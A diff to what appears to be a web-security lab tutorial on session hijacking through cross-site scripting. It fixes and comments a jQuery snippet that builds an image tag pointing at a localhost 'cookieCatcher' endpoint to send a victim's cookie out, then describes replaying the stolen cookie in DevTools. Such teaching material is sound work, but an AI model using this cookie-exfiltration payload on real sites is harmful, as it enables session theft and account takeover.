@@ -102,8 +102,8 @@ steal their cookie!
   ```javascript
   var img = $('<img>');
   // Read and submit this cookie via the img tag
-  img.attr('src', "http://localhost:3000/cookieCatcher?cookie="))
-  $('body').append(img);
+  img.attr('src', "http://localhost:3000/cookieCatcher?cookie=") // you need to edit this line to pass the cookies to your server. 
+  $('body').append(img); // this will append the HTML element into the DOM and therefore fire a GET request to the URL above.
   ```
 1. Note the value of the cookie in the command line. Use either
   the DevTools console or a Chrome Plugin to create the same cookie
